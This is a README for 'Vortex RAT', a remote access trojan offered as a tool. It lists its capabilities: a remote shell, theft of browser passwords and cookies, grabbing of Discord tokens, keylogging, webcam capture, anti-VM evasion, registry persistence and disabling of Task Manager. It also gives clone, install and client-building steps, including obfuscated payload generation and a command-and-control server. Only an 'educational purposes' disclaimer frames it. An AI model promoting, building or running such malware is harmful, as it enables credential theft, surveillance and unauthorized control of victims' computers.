# Vortex RAT 🌪️

> **⚠️ WARNING & DISCLAIMER:** This software is for educational purposes only. Unauthorized access to computer systems is illegal. The author is not responsible for any misuse or damage caused by this program.

---

## ✨ Features

Vortex RAT is packed with advanced features for complete remote management:

### 🖥️ Remote Management

- **Remote Shell:** Full terminal access to the host machine.
- **Screenshot:** Real-time capture of the host's screen via PowerShell.
- **File Manager:** Comprehensive file system access (List, Upload, Download, Delete, Run).
- **Process Manager:** View and terminate running processes.
- **Webcam Capture:** Access and capture frames from the host's webcam.

### 🔑 Data Recovery & Stealing

- **Browser Stealer:** Extract passwords and cookies from Chrome, Edge, Brave, Opera, and more.
- **Discord Grabber:** Collect Discord tokens from various clients and browsers.
- **Keylogger:** Real-time, stealthy key logging using C# compiled on-the-fly.
- **Clipboard Manager:** View and manipulate the host's clipboard.

### 🛡️ Survival & Persistence

- **Anti-VM:** Detects and terminates in virtualized environments (VirtualBox, VMware, etc.).
- **Persistence:** Automatic startup installation in the Windows registry.
- **Task Manager Protection:** Disables Task Manager to prevent termination.
- **Mutex Protection:** Ensures only one instance of the client is running.

## 🛠️ Technology Stack

- **Frontend:** HTML5, Vanilla CSS, Javascript (Inter & JetBrains Mono fonts).
- **Backend:** Node.js, Electron.
- **Client Stub:** Node.js (Standalone executable via `pkg`).
- **Automation:** PowerShell & C# integration for low-level system access.

---

## 🚀 Getting Started

### Prerequisites

- [Node.js](https://nodejs.org/) (v18 or higher recommended)
- [npm](https://www.npmjs.com/)

### Installation

1. Clone the repository:
   ```bash
   git clone https://github.com/exsarorrayzer/vortexrat.git
   cd VortexRAT
   ```
2. Install dependencies:
   ```bash
   npm install
   ```
3. Start the application:
   ```bash
   npm start

   ```

### Building a Client

1. Open the **Builder** tab in the Vortex UI.
2. Configure your connection settings (IP/Port).
3. Select your desired features (Anti-VM, Startup, etc.).
4. Choose an icon and click **Build EXE**.
5. The built client will be located in the `builds/` folder.

---

## 📂 Project Structure

- `main.js` - Electron main process and IPC handling.
- `server.js` - C2 server logic and client communication.
- `builder.js` - Client generation and obfuscation logic.
- `renderer.js` - UI logic and event handling.
- `styles.css` - Custom Dark Red theme styles.
- `index.html` - Main application layout.

---

<p align="center">
  Developed by Rayzer
</p>
